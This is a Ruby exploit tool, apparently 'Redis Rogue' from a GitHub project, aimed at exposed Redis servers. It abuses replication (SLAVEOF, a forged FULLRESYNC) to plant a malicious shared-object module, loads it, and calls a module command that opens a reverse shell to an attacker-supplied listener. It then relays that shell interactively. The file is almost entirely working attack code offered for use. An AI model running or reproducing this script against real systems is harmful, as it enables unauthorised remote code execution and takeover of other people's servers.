#!/usr/bin/ruby

puts <<-'EOF'
____          _ _       ____                        
|  _ \ ___  __| (_)___  |  _ \ ___   __ _ _   _  ___ 
| |_) / _ \/ _` | / __| | |_) / _ \ / _` | | | |/ _ \
|  _ <  __/ (_| | \__ \ |  _ < (_) | (_| | |_| |  __/
|_| \_\___|\__,_|_|___/ |_| \_\___/ \__, |\__,_|\___|
                                    |___/            

By Levitating
https://github.com/LevitatingBusinessMan/redis-rogue

Version 0.0.1

EOF

#Reference: https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf

require "socket"
require "optparse"

@opts = {port: "6379", skip: false, verbose: false}
OptionParser.new do |parser|
	parser.banner = "Usage: ./redis_rogue.rb [options]"

	parser.on("-h", "--host HOST", "Victim") do |h|
		@opts[:host] = h
	end
	
	parser.on("-p", "--port PORT", /\d*/, "Port (default: 6379)") do |p|
		@opts[:port] = p
	end

	parser.on("--lhost LHOST" ,"Address to listen on") do |lhost|
		@opts[:lhost] = lhost
	end

	parser.on("-l","--lport LPORT", /\d*/, "Port to listen on") do |lport|
		@opts[:lport] = lport
	end

	parser.on("-s","--skip-load", "For when the module is already loaded") do |lport|
		@opts[:skip] = true
	end

	parser.on("-v","--verbose", "Log more information") do |lport|
		@opts[:verbose] = true
	end

end.parse!

for arg in [:host,:lhost,:lport]
	if !@opts[arg]
		abort "Missing #{arg}! (--help for usage)"
	end
end

if !/^[0-9\.]+$/.match? @opts[:lhost]
	abort "LHOST has to be a valid IPv4 address"
end

class Log

	def self.info msg
		print "\e[34m[info]\e[0m "
		p msg
	end

	def self.succ msg
		print "\e[32m[succ]\e[0m "
		p msg
	end

	def self.warn msg
		print "\e[93m[warn]\e[0m "
		p msg
	end

	def self.err msg
		print "\e[31m[err]\e[0m "
		p msg
	end

	def self.sen msg
		print "\e[31m[>>]\e[0m "
		p msg
	end
	
	def self.rec msg
		print "\e[32m[<<]\e[0m "
		p msg
	end

end

def error msg
	Log.err msg
	exit 1
end

def send msg
	@client.puts msg
	Log.sen msg if @opts[:verbose]
end

def rec (print=true)
	msg = @client.gets
	if msg == nil
		Log.err "Received empty message, the socket prob closed"
		raise
	end
	msg.gsub!(/[\r\n]/, "")
	Log.rec msg if print && @opts[:verbose]
	return msg || ""
end

def exploit
	server = TCPServer.new @opts[:lport]

	send "pwn.revshell #{@opts[:lhost]} #{@opts[:lport]}"

	shell = server.accept

	error "Error connecting to LHOST" if !rec.start_with? "+OK"
	Log.succ "Succesfull connect-back"

	Log.info "Starting (fully upgradeable) shell"

	loop do
		begin
			print shell.read_nonblock(1)
		rescue
		end
		begin
			shell.write STDIN.read_nonblock(1)
		rescue
		end
	end
end

# Skip most of the exploit
if @opts[:skip]
	Log.info "Skipping module loading"
	@client = TCPSocket.new(@opts[:host], @opts[:port])
	@client
	exploit
	exit
end

#Our MASTER server
server = TCPServer.new 2421

#We use this connection to force the server to connect to our master server
initial_sock = TCPSocket.new(@opts[:host], @opts[:port])
@client = initial_sock
Log.info "Sending SLAVEOF command"
send "SLAVEOF 127.0.0.1 2421"
error "Failed to send SLAVEOF" if !rec.start_with? "+OK"
Log.info "Renaming database file"
send "CONFIG SET dbfilename pwn"
error "Failed to set dbfilename" if !rec.start_with? "+OK"

class String
	def is_number?
		true if Float(self) rescue false
	end
end

def parser msg
	return Log.err "Can't parse argument count" if !msg.start_with? "*" or !msg[1..].is_number?
	argument_count = msg[1..].to_i
	arguments = []

	for i in (0..argument_count-1)
		arg_length = rec false
		return Log.err "Can't parse argument length" if !arg_length.start_with? "$" or !arg_length[1..].is_number?
		arg_length = arg_length[1..].to_i
		argument = rec false
		if argument.length != arg_length
			Log.warn "Argument length and specified length mis-match"
		end
		arguments.push argument
	end
	return arguments
end

payload = File.read("./module.so")

#We only accept once, it will attempt to make new connections because our data is invalid
@client = server.accept
Log.succ "Succesful connection with slave"

# Resync database
loop do
	if msg = rec(false)
		arguments = parser msg
		Log.rec arguments.join " " if @opts[:verbose]
		next if !arguments
		case arguments[0]
		when "PING"
			send "+PONG"
		when "REPLCONF"
			send "+OK"
		when "PSYNC", "SYNC"
			#send "+CONTINUE #{arguments[1]} 0"
			send "+FULLRESYNC #{"A" * 40} 1\r\n"
			Log.info "Sending payload..."
			@client.puts "$#{payload.length}\r\n#{payload}"
			Log.sen "(bulk string containing binary data )" if @opts[:verbose]

			#This socket is dead
			break

		end
	end
end

error "Database resync failed, payload not send" if @payload_send == false

@client = initial_sock #Reuse old connection to send commands

sleep 0.5
Log.info "Attempt to load module"
send "module load ./pwn"
error "Failed to load module (if it's already loaded use the -s flag)" if !@client.gets.start_with? "+OK"
Log.succ "Succesfully loaded the module"

exploit
